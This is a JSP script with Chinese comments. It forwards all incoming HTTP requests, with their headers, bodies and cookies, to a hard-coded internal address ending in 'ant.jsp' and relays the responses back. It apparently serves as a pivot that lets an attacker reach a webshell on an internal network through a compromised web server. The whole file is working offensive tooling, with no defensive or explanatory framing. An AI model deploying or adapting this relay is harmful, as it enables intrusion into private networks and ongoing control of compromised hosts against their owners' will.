<%@ page session="false" trimDirectiveWhitespaces="true" import="java.net.*,java.util.Map,java.util.List,java.io.*,java.util.Arrays,java.util.Enumeration,java.nio.charset.Charset" contentType="text/html;charset=UTF-8" language="java" %>
<%!
    public String getBody(HttpServletRequest request) throws IOException {
        InputStream in = request.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(in, Charset.forName("UTF-8")));
        StringBuffer sb = new StringBuffer("");
        String temp;
        while ((temp = br.readLine()) != null) {
            sb.append(temp);
        }
        if (in != null) {
            in.close();
        }
        if (br != null) {
            br.close();
        }
        return sb.toString();
    }
    public String getChunkedBody(HttpURLConnection conn) throws Exception {
        InputStream in = conn.getInputStream();
        ByteArrayOutputStream tmpos = new ByteArrayOutputStream(4);
        ByteArrayOutputStream bytes = new ByteArrayOutputStream();
        int data = -1;
        int[] aaa = new int[2];
        byte[] aa = null;

        while ((data = in.read()) >= 0) {
            aaa[0] = aaa[1];
            aaa[1] = data;
            if (aaa[0] == 13 && aaa[1] == 10) {
                aa = tmpos.toByteArray();
                int num = 0;
                try {
                    num = Integer.parseInt(new String(aa, 0, aa.length - 1)
                            .trim(), 16);
                } catch (Exception e) {
                    System.out.println("aa.length:" + aa.length);
                    e.printStackTrace();
                }

                if (num == 0) {

                    in.read();
                    in.read();
                    return bytes.toString();
                }
                aa = new byte[num];
                int sj = 0, ydlen = num, ksind = 0;
                while ((sj = (in.read(aa, ksind, ydlen))) < ydlen) {
                    ydlen -= sj;
                    ksind += sj;
                }

                bytes.write(aa);
                in.read();
                in.read();
                tmpos.reset();
            } else {
                tmpos.write(data);
            }
        }
        return tmpos.toString();
    }
    public String getRespBody(HttpURLConnection conn) throws IOException {
        InputStream in = conn.getInputStream();
        BufferedReader br = new BufferedReader(new InputStreamReader(in, Charset.forName("UTF-8")));
        StringBuffer sb = new StringBuffer("");
        String temp;
        while ((temp = br.readLine()) != null) {
            sb.append(temp);
            sb.append("\n");
        }
        if (in != null) {
            in.close();
        }
        if (br != null) {
            br.close();
        }
        return sb.toString();
    }
%>
<%
    CookieManager manager = new CookieManager();
    CookieHandler.setDefault(manager);
    // 目标
    String target = "http://172.23.0.2:8080/ant.jsp";
    String queryString = request.getQueryString();
    if(queryString != null && queryString.length() > 0) {
        target = target + "?" + queryString;
    }
    URL url = new URL(target);
    // Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress("172.16.26.218", 3080));
    // HttpURLConnection conn = (HttpURLConnection) url.openConnection(proxy);
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod(request.getMethod());
    conn.setConnectTimeout(30 * 1000);
    conn.setDoOutput(true);
    conn.setDoInput(true);
    conn.setInstanceFollowRedirects(false);
    // 获取 header
    Enumeration headerNames = request.getHeaderNames();
    String[] blackHeader = new String[]{"host", "connection", "transfer-encoding", "content-length"};
    while(headerNames.hasMoreElements()) {
        String headerName = (String)headerNames.nextElement();
        if(Arrays.asList(blackHeader).contains(headerName)) {
            continue;
        }
        String headerValue = request.getHeader(headerName);
        conn.setRequestProperty(headerName, headerValue);
    }

    // 向 request 写 body
    int readLen = request.getContentLength();
    if (readLen > 0) {
        String reqbody = getBody(request);
        OutputStream connos = conn.getOutputStream();
        connos.write(reqbody.getBytes());
        connos.flush();
    }
    // 向 request 写 header
    response.reset();
    String[] blackRespHeader = new String[]{"content-length", "set-cookie", "connection"};
    Boolean isChunked = false;
    for (Map.Entry<String, List<String>> entries : conn.getHeaderFields().entrySet()) {
        if(entries.getKey() == null) {
            continue;
        }
        if(Arrays.asList(blackRespHeader).contains(entries.getKey().toLowerCase())) {
            continue;
        }
        String values = "";
        for (String value : entries.getValue()) {
            values += value;
        }
        if (entries.getKey().toLowerCase().equals("transfer-encoding") && values.indexOf("chunked") > -1) {
            isChunked = true;
            continue;
        }
        response.addHeader(entries.getKey(), values);
    }
    // 处理返回包 Cookie
    CookieStore cookieStore = manager.getCookieStore();
    List<HttpCookie> listcookie= cookieStore.getCookies();
    for (HttpCookie cookie : listcookie) {
        Cookie c = new Cookie(cookie.getName(), cookie.getValue());
        response.addCookie(c);
    }
    // 读返回包数据
    String result;
    if(isChunked){
        result = getChunkedBody(conn);
    } else {
        result = getRespBody(conn);
    }
    response.setStatus(conn.getResponseCode());
    out.print(result);
%>
